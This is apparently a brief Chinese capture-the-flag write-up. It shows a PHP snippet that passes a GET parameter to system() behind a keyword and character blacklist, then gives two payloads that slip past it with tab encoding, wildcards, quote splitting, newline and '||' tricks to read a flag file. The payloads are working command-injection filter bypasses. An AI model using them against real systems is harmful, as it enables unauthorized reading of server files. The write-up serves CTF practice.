# 知识点
# 思路
源码
```bash
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
payload
```bash
方法一 ?c=tac%09fla?.php%0a
方法二 ?c=nl<fla''g.php||
```
![image.png](./images/20231017_2350506998.png)
